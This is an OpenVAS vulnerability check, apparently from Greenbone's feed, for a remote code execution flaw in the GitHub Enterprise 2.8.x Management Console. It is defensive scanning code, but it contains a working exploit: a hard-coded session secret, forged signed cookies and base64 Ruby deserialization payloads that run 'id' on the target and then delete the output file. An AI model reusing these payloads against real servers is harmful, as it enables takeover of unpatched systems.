###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_github_enterprise_management_console_rce_03_17.nasl 11937 2018-10-17 09:25:36Z cfischer $
#
# Remote code execution in GitHub Enterprise Management Console
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:github:github_enterprise';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140196");
  script_version("$Revision: 11937 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-17 11:25:36 +0200 (Wed, 17 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-03-17 17:11:03 +0100 (Fri, 17 Mar 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Remote code execution in GitHub Enterprise Management Console");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_github_enterprise_web_detect.nasl");
  script_require_ports("Services/www", 8443, 8080);
  script_mandatory_keys("github/enterprise/management_console/detected");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/141653/GitHub-Enterprise-2.8.x-Remote-Code-Execution.html");
  script_xref(name:"URL", value:"https://enterprise.github.com/releases/2.8.7/notes");

  script_tag(name:"summary", value:"GitHub Enterprise versions 2.8.x prior to 2.8.6 suffer from a remote code execution vulnerability.");

  script_tag(name:"vuldetect", value:"Send some HTTP requests with a special crafted Cookie and check the response.");

  script_tag(name:"impact", value:"Successful exploit allows an attacker to execute arbitrary commands in context of the affected application.");

  script_tag(name:"insight", value:"It is possible to inject arbitrary commands via modified cookie.");

  script_tag(name:"solution", value:"Update to 2.8.6 or newer.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_active");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");
include("host_details.inc");
include("misc_func.inc");

SECRET = "641dd6454584ddabfed6342cc66281fb";

function set_file( file, dump )
{
  local_var file, dump, tmp;
  if( ! file || ! dump ) return;

  search = 'openvas_1808149858';

  tmp = base64_decode( str:dump );

  tmp = str_replace( string:tmp, find:search, replace:file );

  dump = base64( str:tmp );

  return dump;

}

function build_cookie( dump )
{
  local_var dump;

  if( ! dump ) return;

  hmac = hexstr( HMAC_SHA1( data:dump, key:SECRET ) );
  cookie = '_gh_manage=' + urlencode( str: dump + '--' + hmac );

  return cookie;

}

if( ! port = get_app_port( cpe:CPE, service:"www" ) ) exit( 0 );
if( ! dir = get_app_location( port:port, cpe:CPE ) ) exit( 0 );

url = dir + '/unlock'; # nb: gb_github_enterprise_web_detect.nasl is registering the dir as "/setup".
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( "Set-Cookie:" >!< buf || "_gh_manage" >!< buf ) exit( 0 );

c = eregmatch( pattern:'_gh_manage=([^\r\n; ]+)', string:buf );

if( isnull( c[1] ) )
  exit( 0 );

cookie = c[1];

s = split( cookie, sep:'--', keep:FALSE );

if( isnull( s[0] ) || isnull( s[1] ) )
  exit( 0 );

data = s[0];
data = urldecode( estr:data );

hmac = s[1];

hash = hexstr( HMAC_SHA1( data:data, key:SECRET ) );

if( hash != hmac ) exit( 99 );

# id > ./public/openvas_1808149858
dump = 'BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiAAY7AFRJIgxleHBsb2l0BjsAVG86' +
       'QEFjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uOjpEZXByZWNhdGVkSW5zdGFu' +
       'Y2VWYXJpYWJsZVByb3h5CDoOQGluc3RhbmNlbzoSRXJ1YmlzOjpFcnVieQY6' +
       'CUBzcmNJIiwleHtpZCA+IC4vcHVibGljL29wZW52YXNfMTgwODE0OTg1OH07' +
       'IDEGOwBUOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsAVA==';

file = 'openvas_' + rand_str( length:10, charset:'0123456789' );

dump = set_file( file:file, dump:dump );
cookie = build_cookie( dump:dump );

req = http_get_req( port:port, url:"/", add_headers: make_array( "Cookie", cookie) );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( buf !~ "HTTP/1\.. 302" ) exit( 99 );

url = '/' + file;
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( buf =~ "uid=[0-9]+.*gid=[0-9]+" )
{
  result = buf;

  # rm ./public/openvas_1808149858
  dump = 'BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiAAY7AFRJIgxleHBsb2l0BjsAVG86' +
         'QEFjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uOjpEZXByZWNhdGVkSW5zdGFu' +
         'Y2VWYXJpYWJsZVByb3h5CDoOQGluc3RhbmNlbzoSRXJ1YmlzOjpFcnVieQY6' +
         'CUBzcmNJIioleHtybSAuL3B1YmxpYy9vcGVudmFzXzE4MDgxNDk4NTh9OyAx' +
         'BjsAVDoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7AFQ=';

  dump = set_file( file:file, dump:dump );

  cookie = build_cookie( dump:dump );
  req = http_get_req( port:port, url:"/", add_headers: make_array( "Cookie", cookie) );

  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  security_message( port:port, data:'It was possible to execute the `id` command on the remote host.\n\nResult: ' + result + '\n');
  exit( 0 );
}

exit( 99 );

